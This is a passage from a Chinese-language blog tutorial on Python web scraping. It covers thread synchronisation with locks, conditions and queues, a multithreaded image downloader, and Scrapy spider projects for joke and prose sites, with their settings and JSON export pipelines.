gMoney))\n\t\t\t\tgCondition.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tdef main():\n\t\tfor x in range(3):\n\t\t\tt = Cosumer(name=\"消费者线程%s\" % x)\n\t\t\tt.start()\n\t\tfor y in range(5):\n\t\t\tt1 = Producer(name=\"生产者线程%s\" % y)\n\t\t\tt1.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n- 多线程Lock与condition方法总结：\n  1. 在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，\n     这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费\n  2. 当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，\n     使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就\n     减少了循环过程中因上锁解锁而导致的CPu资源浪费\n\n* Queue线程安全队列\n  在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块\n  叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要\n  么做完。可使用队列来实现线程的同步。相关函数如下：\n  作用：\n  　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。\n  　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。\n\n1. Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限\n\n2. Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限\n\n3. Queue.qsize()   返回队列的大小\n\n4. Queue.empty()   如果队列为空，返回True,反之False\n\n5. Queue.full()   如果队列满了，返回True,反之False\n\n6. Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间\n\n7. Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间\n\n8. Queue.queue.clear()   清空队列\n\n9. class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高\n\n10. Queue.get(timeout = 1)如果1秒后没取到数据就退出\n\n11. Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常\n\n12. Queue.task_done()后续调用告诉队列，任务的处理是完整的。\n\n```python\n\tfrom queue import Queue\n\timport time\n\timport threading\n\n\n\t# 在队列中放入数值\n\tdef set_value(q):\n\t\tindex = 0\n\t\twhile True:\n\t\t\tq.put(index)\n\t\t\tindex += 1\n\t\t\ttime.sleep(0.8)\n\n\n\t# 取出队列中的数值\n\tdef get_value(q):\n\t\twhile True:\n\t\t\tprint(q.get())\n\n\n\tdef main():\n\t\t# 产生一个队列\n\t\tq = Queue(1)\n\t\tt1 = threading.Thread(target=set_value, args=[q])\n\t\tt2 = threading.Thread(target=get_value, args=[q])\n\n\t\tt1.start()\n\t\tt2.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 生产者与消费者模型\n\n- 代码示例三：(Queue版)\n\n```python\n\timport threading,time\n\t#python2  from Queue import Queue\n\t#python3\n\timport queue\n\t \n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal queue\n\t\t\tcount = 0\n\t\t\twhile True:\n\t\t\t\t#qsize返回queue内部长度\n\t\t\t\tif queue.qsize() < 1000:\n\t\t\t\t\tfor i in range(100):\n\t\t\t\t\t\tcount += 1\n\t\t\t\t\t\tmsg = '生成产量'+str(count)\n\t\t\t\t\t\t#put是往queue中放入\n\t\t\t\t\t\tqueue.put(msg)\n\t\t\t\t\t\tprint(msg)\n\t\t\t\ttime.sleep(0.5)\n\tclass Consumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal queue\n\t\t\twhile True:\n\t\t\t\tif queue.qsize() > 100:\n\t\t\t\t\tfor i in range(3):\n\t\t\t\t\t\t#get从queue中取出一个值\n\t\t\t\t\t\tmsg = self.name + \"消费了\"+queue.get()\n\t\t\t\t\t\tprint(msg)\n\t\t\t\ttime.sleep(1)\n\tif __name__ == '__main__':\n\t\tqueue = queue.Queue()\n\t\tfor i in range(500):\n\t\t\tqueue.put(\"初始产品\"+str(i))\n\t\tfor i in range(2):\n\t\t\tp = Producer()\n\t\t\tp.start()\n\t\tfor i in range(5):\n\t\t\tc = Consumer()\n\t\t\tc.start()\n\t\t\t\n```\n\n### 爬虫之多线程\n\n* 多线程爬虫框架代码\n\n```python\n\timport requests\n\tfrom lxml import etree\n\timport os\n\timport re\n\tfrom queue import Queue\n\timport threading\n\n\t\"\"\" \n\t我们引入了threading这个包，我们将使用这个包中的\n\tThread类，并在我们自定义的类中继承这个Thread类\n\t\"\"\"\n\n\n\t# 生产者线程\n\tclass Procuder(threading.Thread):\n\t\theaders = {\n\t\t\t\t'User-Agent': '... 浏览器...'\n\t\t}\n\n\t\t\"\"\" 重写继承于父类的__init__方法 \"\"\"\n\t\t\"\"\" 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收\"\"\"\n\t\tdef __init__(self, page_queue, img_queue, *args, **kwargs):\n\t\t\tsuper(Procuder, self).__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\n\t\t\"\"\" 重写继承于父类的run方法，改成我们想要的方法\"\"\"\n\t\t\"\"\" 从存放每页的url的队列中逐一挑出一个url并传入parse_page中\n\t\t\t获取每页的url\n\t\t\"\"\"\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\turl = self.page_queue.get()\n\t\t\t\tself.parse_page(url)\n\n\t\tdef parse_page(self, url):\n\t\t\t\"\"\" \n\t\t\t.......\n\t\t\t\n\t\t\t获取每页的响应数据，并从中提取出每张图片的\n\t\t\turl和name，并放入队列中\n\t\t\t\"\"\"\n\n\n\t# 消费者线程\n\tclass Consumer(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, *args, **kwargs):\n\t\t\tsuper(Procuder, self).__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.img_queue.empty() and self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\t\t\"\"\"\n\t\t\t\t\t......\n\t\t\t\t\t\n\t\t\t\t\t利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存\n\t\t\t\t\t\"\"\"\n\n\tdef main():\n\t\t\"\"\" 设置页数和图片的url队列\"\"\"\n\t\tpage_queue = Queue()\n\t\timg_queue = Queue()\n\n\t\t# 将每页的url放到页数队列中\n\t\tfor x in range(1, 101):\n\t\t\turl = 'http://........ %d' % x\n\t\t\tpage_queue.put(url)\n\n\t\t# 设置5个生产者线程\n\t\tfor x in range(5):\n\t\t\tt = Procuder(page_queue, img_queue)\n\t\t\tt.start()\n\n\t\t# 设置5个消费者线程\n\t\tfor x in range(5):\n\t\t\tt = Consumer(page_queue, img_queue)\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 多线程爬虫实战代码\n\n```python\n\timport requests\n\timport re\n\tfrom lxml import etree\n\timport threading\n\timport os\n\timport queue\n\tfrom urllib import request\n\n\t# 生产图片的url和name\n\tclass ProimgUrl(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n\t\t\tsuper().__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\t\t\tself.headers = headers\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\turl = self.page_queue.get()\n\t\t\t\t\tself.parse_page(url)\n\n\t\tdef parse_page(self, url):\n\t\t\timg_get = requests.get(url=url, headers=self.headers).text\n\t\t\ttree = etree.HTML(img_get)\n\t\t\timg_it = tree.xpath('//div[@class=\"page-content text-center\"]//a')\n\t\t\tfor it in img_it:\n\t\t\t\timg_url = it.xpath('./img[@class!=\"gif\"]/@data-original')[0]\n\t\t\t\talt = it.xpath('./img/@alt')[0]\n\t\t\t\talt = re.sub(r'[\\?？.!！，。\\/\\*]', '', alt)\n\t\t\t\t# 利用splitext截取图片的后缀名\n\t\t\t\tsuffix = os.path.splitext(img_url)[1]\n\t\t\t\timg_name = alt + suffix\n\t\t\t\tself.img_queue.put((img_url, img_name))\n\n\n\t# 获取图片并储存\n\tclass ConimgName(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n\t\t\tsuper().__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\t\t\tself.headers = headers\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.img_queue.empty() and self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\timg_url, img_name = self.img_queue.get()\n\t\t\t\t\t# 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片\n\t\t\t\t\trequest.urlretrieve(img_url, './smile/'+img_name)\n\t\t\t\t\tprint(img_name + ' 下载成功...')\n\n\tdef main():\n\t\tif not os.path.exists('./smile'):\n\t\t\tos.mkdir('./smile')\n\t\theaders = {\n\t\t\t'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n\t\t\t\t\t\t  'Chrome/80.0.3987.149 Safari/537.36 '\n\t\t}\n\t\tpage_queue = queue.Queue(100)\n\t\timg_queue = queue.Queue(1000)\n\n\t\tfor x in range(1, 10):\n\t\t\turl = 'https://www.doutula.com/photo/list/?page=' + str(x)\n\t\t\tpage_queue.put(url)\n\n\t\tfor i in range(5):\n\t\t\tt = ProimgUrl(page_queue, img_queue, headers)\n\t\t\tt.start()\n\n\t\tfor i in range(5):\n\t\t\tt = ConimgName(page_queue, img_queue, headers)\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的\n\n\n\n# 爬虫第五天\n\n## scrapy爬虫框架\n\n[关于xpath选择器selector的网址](https://zhuanlan.zhihu.com/p/25443389)\n\n\n\n![scrapy框架示意图](https://img-blog.csdnimg.cn/20200328091921480.png)\n\n1. 创建项目\n\n   ​\tscrapy startproject #^%#^(项目名字)\n\n   \n\n2. 创建爬虫\n\n   ​\tscrapy genspider 爬虫名字 网络域名\n\n   注意：\n\n    * 爬虫名字不要和项目名字一样\n    * 网站域名是允许爬虫采集的域名\n      - baidu.com\n\n![创建项目与配置环境后各部分组件](https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)\n\nitem文件是存储数据的\n\n* 在setting文件（程序启动被首先检查的文件）\n\n* BOT_NAME = 爬虫的名字\n\n* ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔\n\n* CONCURRENT_REQUESTS = 爬虫的并发量\n\n* DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管\n\n* COOKLES_ENABLED = cookiede的使用，布尔\n\n* DEFAULT_REQUEST_HEADERS = 默认请求头\n\n* ITEM_PIPELINES = 管道文件\n\n  \n\n  ### setting文件详解\n\n  ```python\n  # -*- coding: utf-8 -*-\n   \n  # Scrapy settings for TestSpider project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n   \n  BOT_NAME = 'TestSpider'\n   \n  SPIDER_MODULES = ['TestSpider.spiders']\n  NEWSPIDER_MODULE = 'TestSpider.spiders'\n   \n   \n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  #USER_AGENT = 'TestSpider (+http://www.yourdomain.com)'\n   \n  USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0'\n   \n  # Obey robots.txt rules\n  # Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。\n  # 默认是True，设置为False不遵守这个协议。\n  ROBOTSTXT_OBEY = False\n   \n   \n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # 配置scrapy的请求连接数，默认会同时并发16个请求。\n  # CONCURRENT_REQUESTS = 10\n   \n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n   \n  # 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0\n  # DOWNLOAD_DELAY = 3\n   \n   \n  # CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。\n  # CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n   \n   \n  # Disable cookies (enabled by default)\n  # 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。\n  # COOKIES_ENABLED = False\n   \n  # Disable Telnet Console (enabled by default)\n  #TELNETCONSOLE_ENABLED = False\n   \n   \n  # Override the default request headers:\n   \n  # 配置默认的请求头Headers.\n  # DEFAULT_REQUEST_HEADERS = {\n  #   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n  #   'Accept-Language': 'en',\n  # }\n   \n   \n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n   \n  # 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。\n  # SPIDER_MIDDLEWARES = {\n  #    'TestSpider.middlewares.TestspiderSpiderMiddleware': 543,\n  # }\n   \n   \n  # 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。\n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = {\n  #    'TestSpider.middlewares.TestspiderDownloaderMiddleware': 543,\n  # }\n   \n   \n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = {\n  #    'scrapy.extensions.telnet.TelnetConsole': None,\n  # }\n   \n   \n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n   \n  # 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。\n  # ITEM_PIPELINES = {\n  #    'TestSpider.pipelines.TestspiderPipeline': 300,\n  # }\n   \n   \n  # 限速配置\n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n   \n  # 是否开启自动限速\n  # AUTOTHROTTLE_ENABLED = True\n   \n   \n  # The initial download delay\n  # 配置初始url的下载延时\n  # AUTOTHROTTLE_START_DELAY = 5\n   \n   \n  # The maximum download delay to be set in case of high latencies\n  # 配置最大请求时间\n  # AUTOTHROTTLE_MAX_DELAY = 60\n   \n   \n  # 配置请求和请求之间的下载间隔，单位是秒\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n   \n   \n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n   \n   \n  # 关于Http缓存的配置，默认是不启用。\n  # 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。\n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  #HTTPCACHE_ENABLED = True\n  #HTTPCACHE_EXPIRATION_SECS = 0\n  #HTTPCACHE_DIR = 'httpcache'\n  #HTTPCACHE_IGNORE_HTTP_CODES = []\n  #HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n  ```\n\n  ### scrapy爬虫之spider类（示例 一：爬取糗事百科）\n\n  - 创建爬虫项目：scrapy startproject xiushi\n  - 创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com\n\n  #### item 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Define here the models for your scraped items\n  #\n  # See documentation in:\n  # https://doc.scrapy.org/en/latest/topics/items.html\n  \n  import scrapy\n  \n  \n  class XiushiItem(scrapy.Item):\n      # define the fields for your item here like:\n      # name = scrapy.Field()\n      title = scrapy.Field()\n      text = scrapy.Field()\n  \n  ```\n\n  #### setting 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Scrapy settings for xiushi project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  \n  BOT_NAME = 'xiushi'\n  \n  SPIDER_MODULES = ['xiushi.spiders']\n  NEWSPIDER_MODULE = 'xiushi.spiders'\n  \n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  # USER_AGENT = 'xiushi (+http://www.yourdomain.com)'\n  \n  # Obey robots.txt rules\n  ROBOTSTXT_OBEY = False\n  \n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # CONCURRENT_REQUESTS = 32\n  \n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n  DOWNLOAD_DELAY = 1\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n  \n  # Disable cookies (enabled by default)\n  # COOKIES_ENABLED = False\n  \n  # Disable Telnet Console (enabled by default)\n  # TELNETCONSOLE_ENABLED = False\n  \n  # Override the default request headers:\n  DEFAULT_REQUEST_HEADERS = {\n      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n      'Accept-Language': 'en',\n      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                    'Chrome/80.0.3987.163 Safari/537.36 '\n  }\n  \n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  # SPIDER_MIDDLEWARES = {\n  #    'xiushi.middlewares.XiushiSpiderMiddleware': 543,\n  # }\n  \n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = {\n  #    'xiushi.middlewares.XiushiDownloaderMiddleware': 543,\n  # }\n  \n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = {\n  #    'scrapy.extensions.telnet.TelnetConsole': None,\n  # }\n  \n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  ITEM_PIPELINES = {\n     'xiushi.pipelines.XiushiPipeline': 300,\n  }\n  \n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n  # AUTOTHROTTLE_ENABLED = True\n  # The initial download delay\n  # AUTOTHROTTLE_START_DELAY = 5\n  # The maximum download delay to be set in case of high latencies\n  # AUTOTHROTTLE_MAX_DELAY = 60\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n  \n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  # HTTPCACHE_ENABLED = True\n  # HTTPCACHE_EXPIRATION_SECS = 0\n  # HTTPCACHE_DIR = 'httpcache'\n  # HTTPCACHE_IGNORE_HTTP_CODES = []\n  # HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n  \n  ```\n\n  #### spider 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  import scrapy\n  from xiushi.items import XiushiItem\n  \n  \n  class XiushispiderSpider(scrapy.Spider):\n      name = 'xiushiSpider'\n      allowed_domains = ['qiushidabaike.com']\n      start_urls = ['http://qiushidabaike.com/index_1.html']\n      base_domain = 'http://qiushidabaike.com'\n  \n      def parse(self, response):\n          duanzi = response.xpath('//div[@class=\"main-left fl\"]//dl')\n          for it in duanzi:\n              title = it.xpath('./dt/span/a/text()').get().strip()\n              text = it.xpath('./dd[@class=\"content\"]//text()').getall()\n              text = \"\".join(text).strip()\n              item = XiushiItem(title=title, text=text)\n              yield item\n          # 进行翻页操作\n          next_url = response.xpath('//div[@class=\"page\"]//a[@class=\"next\"]/@href').get()\n          if not next_url:\n              return\n          else:\n              yield scrapy.Request(self.base_domain+next_url, callback=self.parse)\n  \n  ```\n\n  #### pipelines 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Define your item pipelines here\n  #\n  # Don't forget to add your pipeline to the ITEM_PIPELINES setting\n  # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  \"\"\"\n  # 第一种方法，没进行json优化，但是看起来简单易操作\n  import json\n  \n  \n  class XiushiPipeline(object):\n      def __init__(self):\n          self.fp = open('duanzi.json', 'w', encoding='utf-8')\n  \n      def open_spider(self, spider):\n          print('爬虫开始了...')\n  \n      def process_item(self, item, spider):\n          item_json = json.dumps(dict(item),  ensure_ascii=False)\n          self.fp.write(item_json+'\\n')\n          return item\n  \n      def close_spider(self, spider):\n          self.fp.close()\n          print(\"爬虫结束了...\")\n  \"\"\"\n  # 方案二，json优化，结果是每个字典存储在列表中\n  #        好处是满足json规则，坏处是数据量较大时比较耗内存\n  # ''' 自我感觉这种方法不咋地 '''\n  # from scrapy.exporters import JsonItemExporter\n  #\n  #\n  # class XiushiPipeline(object):\n  #     def __init__(self):\n  #         # 注意此时以二进制形式写入\n  #         self.fp = open('duanzi.json', 'wb')\n  #         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n  #         self.exporter.start_exporting()\n  #\n  #     def open_spider(self, spider):\n  #         print('爬虫开始了...')\n  #\n  #     def process_item(self, item, spider):\n  #         self.exporter.export_item(item)\n  #         return item\n  #\n  #     def close_spider(self, spider):\n  #         self.exporter.finish_exporting()\n  #         self.fp.close()\n  #         print(\"爬虫结束了...\")\n  \n  '''方案三'''\n  from scrapy.exporters import JsonLinesItemExporter\n  \n  \n  class XiushiPipeline(object):\n      def __init__(self):\n          # 注意此时以二进制形式写入\n          self.fp = open('duanzi.json', 'wb')\n          self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n  \n      def open_spider(self, spider):\n          print('爬虫开始了...')\n  \n      def process_item(self, item, spider):\n          self.exporter.export_item(item)\n          return item\n  \n      def close_spider(self, spider):\n          self.fp.close()\n          print(\"爬虫结束了...\")\n  \n  ```\n\n  * 可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)\n\n```python\nfrom scrapy import cmdline\n\ncmdline.execute(\"scrapy crawl xiushiSpider\".split())\n# cmdline.execute([\"scrapy\", 'crawl', 'xiushiSpider'])\n```\n\n# 爬虫第六天\n\n### scrapy 框架之spider类（示例二.爬取优美散文）\n\n- item部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n\nclass ProseItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    text = scrapy.Field()\n\n```\n\n\n\n- settings部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Scrapy settings for prose project\n#\n# For simplicity, this file contains only settings considered important or\n# commonly used. You can find more settings consulting the documentation:\n#\n#     https://doc.scrapy.org/en/latest/topics/settings.html\n#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\nBOT_NAME = 'prose'\n\nSPIDER_MODULES = ['prose.spiders']\nNEWSPIDER_MODULE = 'prose.spiders'\n\n# Crawl responsibly by identifying yourself (and your website) on the user-agent\n# USER_AGENT = 'prose (+http://www.yourdomain.com)'\n\n# Obey robots.txt rules\nROBOTSTXT_OBEY = False\n\n# Configure maximum concurrent requests performed by Scrapy (default: 16)\n# CONCURRENT_REQUESTS = 32\n\n# Configure a delay for requests for the same website (default: 0)\n# See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n# See also autothrottle settings and docs\nDOWNLOAD_DELAY = 1\n# The download delay setting will honor only one of:\n# CONCURRENT_REQUESTS_PER_DOMAIN = 16\n# CONCURRENT_REQUESTS_PER_IP = 16\n\n# Disable cookies (enabled by default)\n# COOKIES_ENABLED = False\n\n# Disable Telnet Console (enabled by default)\n# TELNETCONSOLE_ENABLED = False\n\n# Override the default request headers:\nDEFAULT_REQUEST_HEADERS = {\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                  'Chrome/80.0.3987.163 Safari/537.36 '\n}\n\n# Enable or disable spider middlewares\n# See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n# SPIDER_MIDDLEWARES = {\n#    'prose.middlewares.ProseSpiderMiddleware': 543,\n# }\n\n# Enable or disable downloader middlewares\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n# DOWNLOADER_MIDDLEWARES = {\n#    'prose.middlewares.ProseDownloaderMiddleware': 543,\n# }\n\n# Enable or disable extensions\n# See https://doc.scrapy.org/en/latest/topics/extensions.html\n# EXTENSIONS = {\n#    'scrapy.extensions.telnet.TelnetConsole': None,\n# }\n\n# Configure item pipelines\n# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\nITEM_PIPELINES = {\n   'prose.pipelines.ProsePipeline': 300,\n}\n\n# Enable and configure the AutoThrottle extension (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n# AUTOTHROTTLE_ENABLED = True\n# The initial download delay\n# AUTOTHROTTLE_START_DELAY = 5\n# The maximum download delay to be set in case of high latencies\n# AUTOTHROTTLE_MAX_DELAY = 60\n# The average number of requests Scrapy should be sending in parallel to\n# each remote server\n# AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n# Enable showing throttling stats for every response received:\n# AUTOTHROTTLE_DEBUG = False\n\n# Enable and configure HTTP caching (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n# HTTPCACHE_ENABLED = True\n# HTTPCACHE_EXPIRATION_SECS = 0\n# HTTPCACHE_DIR = 'httpcache'\n# HTTPCACHE_IGNORE_HTTP_CODES = []\n# HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n\n```\n\n- proseSpider部分\n\n```python\n# -*- coding: utf-8 -*-\nimport scrapy\nfrom prose.items import ProseItem\n\n\nclass ProsespiderSpider(scrapy.Spider):\n    name = 'proseSpider'\n    allowed_domains = ['duwenzhang.com']\n    start_urls = ['http://www.duwenzhang.com/wenzhang/shenghuosuibi/']\n    base_url = 'http://www.duwenzhang.com/wenzhang/shenghuosuibi/'\n\n    def parse(self, response):\n        # xpath 选择不含有某一属性的标签\n        url_list = response.xpath('//center//tr[2]//td[(@valign) and not(@height)]/table')\n        for it in url_list:\n            title = it.xpath('.//tr[2]//td[@height=\"26\"]/b/a/text()').getall()\n            text = it.xpath('.//tr[4]/td[@style=\"padding-left:3px\"]/text()').getall()\n            text = \"\".join(text).strip()\n            item = ProseItem(title=title, text=text)\n            yield item\n        # //a[contains(text(), \"百度搜索\")]  【可以部分检索】\n        # //a[text()=\"文字内容\"] 【需要填全】 xpath定位指定文本标签\n        next_url = response.xpath('//tr//a[text()=\"下一页\"]/@href').get()\n        if not next_url:\n            return\n        else:\n            yield scrapy.Request(self.base_url+next_url, callback=self.parse)\n\n\n```\n\n\n\n- piplines 部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Define your item pipelines here\n#\n# Don't forget to add your pipeline to the ITEM_PIPELINES setting\n# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n\nimport json\nfrom scrapy.exporters import JsonLinesItemExporter\n\n\nclass ProsePipeline(object):\n    def __init__(self):\n        self.fp = open('prose.json', 'wb')\n        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False,\n                                              encoding='utf-8')\n\n    def open_spider(self, spider):\n        print('爬虫开始了...')\n\n    def process_item(self, item, spider):\n        self.exporter.export_item(item)\n        return item\n\n    def close_spider(self, spider):\n        self.fp.close()\n        print('爬虫结束了....')\n```\n\n\n\n","source":"_posts/spider.md","raw":"---\ntitle: python爬虫实战\ndate: 2020/5/3 9:08:28\ncomments: ture\ncategories:\n- 爬虫\n- python\ntags:\n- 爬虫\n- python\n---\n\n# 爬虫第一天\n\n- urllib太过古老，因此不加以深入学习\n\n### 